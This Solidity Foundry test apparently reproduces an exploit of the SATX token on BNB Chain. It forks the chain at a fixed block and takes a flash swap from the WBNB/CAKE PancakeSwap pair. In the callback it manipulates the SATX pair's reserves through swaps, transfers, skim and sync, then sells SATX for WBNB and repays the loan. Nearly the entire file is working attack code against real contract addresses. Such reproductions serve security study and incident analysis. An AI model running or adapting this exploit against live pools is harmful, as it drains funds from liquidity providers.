// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../../src/interface/interface.sol";

contract ContractTest is Test {
    address public attacker = address(this);
    IERC20 constant SATX = IERC20(0xFd80a436dA2F4f4C42a5dBFA397064CfEB7D9508);
    IWBNB constant WBNB =
        IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    IPancakePair pair_WBNB_SATX =
        IPancakePair(0x927d7adF1Bcee0Fa1da868d2d43417Ca7c6577D4);
    IPancakePair pair_WBNB_CAKE =
        IPancakePair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);
    IPancakeRouter router =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));

    function setUp() public {
        vm.createSelectFork("bsc", 37914433);
        vm.label(address(SATX), "SATX");
        vm.label(address(WBNB), "WBNB");
        vm.label(address(router), "PancakeSwap Router");
        vm.label(address(pair_WBNB_SATX), "pair_WBNB_SATX");
        vm.label(address(pair_WBNB_CAKE), "pair_WBNB_CAKE");
    }

    function testExploit() public {
        deal(attacker, 0.900000001 ether);
        console2.log("--- ~ testExploit ~ attacker:", WBNB.balanceOf(attacker));
        WBNB.deposit{value: 0.9 ether}();
        console2.log("--- ~ testExploit ~ attacker:", WBNB.balanceOf(attacker));
        // approve
        SATX.approve(address(router), type(uint256).max);
        WBNB.approve(address(router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(SATX);
        router.swapExactTokensForTokens(
            1000000000000000,
            0,
            path,
            attacker,
            type(uint256).max
        );
        console2.log("-- SATX-- ", SATX.balanceOf(attacker));
        router.addLiquidity(
            address(WBNB),
            address(SATX),
            1000000000000000,
            SATX.balanceOf(address(this)),
            0,
            0,
            attacker,
            type(uint256).max
        );
        console2.log(
            "--- ~ testExploit ~ attacker 1 :",
            WBNB.balanceOf(attacker)
        );
        pair_WBNB_CAKE.swap(0, 60000000000000000000, attacker, bytes("0x"));
        console2.log(
            "--- ~ testExploit ~ attacker 2 :",
            WBNB.balanceOf(attacker)
        );
        // WBNB.withdraw(WBNB.balanceOf(attacker));
        // console2.log(
        //     "--- ~ testExploit ~ attacker 3:",
        //     WBNB.balanceOf(attacker)
        // );
    }

    function pancakeCall(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external {
        console2.log("--- ~ sender:", sender, amount0, amount1);
        console2.log("--- ~ sender:", SATX.balanceOf(address(pair_WBNB_SATX)));
        console2.log(
            "--- ~ sender:",
            msg.sender,
            address(pair_WBNB_CAKE),
            address(pair_WBNB_SATX)
        );
        if (msg.sender == address(pair_WBNB_CAKE)) {
            console2.log("1111");
            pair_WBNB_SATX.swap(
                100000000000000,
                SATX.balanceOf(address(pair_WBNB_SATX)) / 2,
                attacker,
                data
            );
            SATX.transfer(
                address(pair_WBNB_SATX),
                SATX.balanceOf(address(this))
            );
            pair_WBNB_SATX.skim(attacker);
            pair_WBNB_SATX.sync();
            WBNB.transfer(address(pair_WBNB_SATX), 100000000000000);
            address[] memory path = new address[](2);
            path[0] = address(SATX);
            path[1] = address(WBNB);
            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                SATX.balanceOf(address(this)),
                0,
                path,
                attacker,
                type(uint256).max
            );
            WBNB.transfer(address(pair_WBNB_CAKE), 60150600000000000000);
        } else if (msg.sender == address(pair_WBNB_SATX)) {
            console2.log("2222");
            WBNB.transfer(address(pair_WBNB_SATX), 52000000000000000000);
        }
    }

    fallback() external payable {}
}
